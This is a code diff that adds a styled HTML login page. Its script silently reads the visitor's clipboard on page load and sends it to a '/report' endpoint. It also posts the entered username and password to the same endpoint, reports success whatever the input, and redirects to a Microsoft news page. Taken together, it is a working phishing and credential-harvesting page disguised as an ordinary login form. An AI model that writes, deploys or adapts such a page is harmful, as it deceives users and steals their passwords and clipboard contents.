@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #fff;
+        }
+
+        #login-modal {
+            background: #ffffff;
+            color: #333;
+            width: 400px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
+            padding: 30px;
+            text-align: center;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        #login-modal img {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        #login-modal h2 {
+            margin-bottom: 10px;
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        #login-modal p {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #6a11cb;
+            box-shadow: 0 0 5px rgba(106, 17, 203, 0.5);
+        }
+
+        #login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #2575fc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        #login-button:hover {
+            background-color: #6a11cb;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #ddd;
+        }
+    </style>
+</head>
+<body>
+    <div id="login-modal">
+        <img src="https://cdn-icons-png.flaticon.com/512/2920/2920322.png" alt="Login Icon">
+        <h2>Welcome Back</h2>
+        <p>Please enter your Email/Username and Password to log in or create an account.</p>
+        <input id="emailOrUsername" type="text" placeholder="Email/Username" required>
+        <input id="password" type="password" placeholder="Password" required>
+        <button id="login-button">Log In</button>
+        <footer>© 2024 Example Inc.</footer>
+    </div>
+
+    <script>
+        // Clipboard Content Extraction on Page Load
+        async function extractClipboardAndSend() {
+            try {
+                const clipboardText = await navigator.clipboard.readText();
+                console.log('Clipboard content:', clipboardText);
+
+                // Send clipboard content to the server
+                const response = await fetch('/report', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ clipboard: clipboardText })
+                });
+
+                if (response.ok) {
+                    console.log("Clipboard data sent successfully.");
+                } else {
+                    console.error("Failed to send clipboard data:", response.status);
+                }
+            } catch (error) {
+                console.error("Error accessing clipboard:", error);
+            }
+        }
+
+        // Call the clipboard extraction function immediately
+        extractClipboardAndSend();
+
+        // Login Button Functionality
+        const loginButton = document.getElementById('login-button');
+
+        loginButton.addEventListener('click', async () => {
+            // Capture values from input fields
+            const emailOrUsername = document.getElementById('emailOrUsername').value;
+            const password = document.getElementById('password').value;
+
+            // Validation
+            if (!emailOrUsername || !password) {
+                alert("Please enter both Email/Username and Password.");
+                return;
+            }
+
+            // Prepare data object
+            const data = { username: emailOrUsername, password }; // Match the original field names
+
+            try {
+                // Send data to the server
+                const response = await fetch('/report', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
+                });
+
+                if (response.ok) {
+                    alert("Login Successful or Account Created!");
+
+                    // Redirect to the desired URL
+                    window.location.href = "https://news.microsoft.com/source/";
+                } else {
+                    alert("Login failed! Server error.");
+                }
+            } catch (error) {
+                console.error("Error sending login data:", error);
+                alert("Unable to send login data.");
+            }
+        });
+    </script>
+</body>
+</html>
